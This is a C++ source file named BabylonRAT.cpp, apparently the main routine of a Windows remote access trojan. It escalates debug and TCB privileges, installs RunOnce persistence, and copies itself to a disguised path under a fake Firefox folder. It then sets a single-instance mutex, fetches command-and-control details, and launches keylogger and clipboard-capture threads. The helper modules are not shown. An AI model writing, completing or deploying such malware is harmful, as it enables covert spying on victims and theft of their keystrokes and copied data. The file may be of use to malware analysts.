// BabylonRAT.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <commctrl.h>
#include <windows.h>

#include <stdlib.h>
#include <gdiplus.h>
#include "rat_modules.h"
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"Comctl32.lib")
#pragma comment(lib,"gdiplus.lib")
using namespace Gdiplus;
int main()
{


	//MessageBoxA(NULL, "Your message here", "Title Here", MB_OK);
	EscalatePrivileges("SeShutdownPrivilege");
	EscalatePrivileges("SeDebugPrivilege");
	EscalatePrivileges("SeTcbPrivilege");
	
	PersistRunOnce_DropSelf();

	int compareResult = CompareSelfPathToTargetPath();
	//compareResult = 0; // for debug
	if (compareResult != 0) {
		
		//This happens when the selfPath isn't the TargetPath 
		
		const wchar_t* intendedFullPath = L"C:\\ProgramData\\Firefox\\Leon.exe";
		ExecuteTargetPath_NoArg(intendedFullPath);
		return 0;
	}

	//This happens when the selfPath IS INDEED the TargetPath
	
	int NumArgs = RetriveCmdlineArgs();

	if (NumArgs > 1) {

		// if there are any args (PID of PARENT) 
		
		NumArgOperation(NumArgs);
		
		return 0;
	}

	
	const wchar_t* mutexName = L"0645a05e-256e-471b-9b5e-b0ac2fc5bae6";
	HANDLE hMutex = MutexOperations(mutexName);
	if (!hMutex) {
		//printf("hMutex already exist, value -> %d\n",(int) hMutex);
		
		return 1;

	}

	//printf("hMutex is created\n");

	int sockResult = StartSocket(); // still if statements to be done
	// if sockResult is 0 then success
	if (sockResult != 0) {
		// fail
		return 1;
	}
	if (StartGDI() != Ok) { printf("[x] StartGDI() Failed\n"); return 1; }

	InitCriticalSections();
	


	GetC2Info();


	INITCOMMONCONTROLSEX initCommonControlsExStruct = { 0 };
	initCommonControlsExStruct.dwSize = (DWORD) sizeof(INITCOMMONCONTROLSEX);
	initCommonControlsExStruct.dwICC = (DWORD) 0x3fff;
	InitCommonControlsEx(&initCommonControlsExStruct);

	int data_4b9b3e = 1;
	if (data_4b9b3e) {

		wchar_t selfPath[0x104] = { 0 };
		GetModuleFileNameW(NULL, selfPath, 0x104);
		DWORD selfPID = GetCurrentProcessId();
		ThreadOperations(0, selfPath, selfPID);
	}


	HANDLE hThread_1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InitKeylogOps, NULL, 0, NULL);
	HANDLE hThread_2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InitClipboardOps, NULL, 0, NULL);

	return 0;

}

